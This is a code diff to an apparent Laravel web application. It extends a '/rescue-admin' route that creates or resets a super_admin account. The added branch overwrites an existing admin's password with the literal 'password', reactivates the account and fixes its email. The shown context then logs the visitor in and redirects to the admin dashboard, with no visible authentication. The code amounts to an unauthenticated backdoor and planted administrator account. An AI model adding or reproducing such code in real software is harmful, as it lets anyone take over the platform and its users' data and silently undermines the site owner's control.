@@ -49,6 +49,11 @@ Route::get('/rescue-admin', function () {
             'role' => 'super_admin',
             'is_active' => true,
         ]);
+    } else {
+        $user->password = \Illuminate\Support\Facades\Hash::make('password');
+        $user->is_active = true;
+        $user->email = 'contato@oodelivery.online'; // Ensure email is exactly this
+        $user->save();
     }
     \Illuminate\Support\Facades\Auth::login($user);
     return redirect(config('platform.admin_path', 'admin') . '/dashboard');
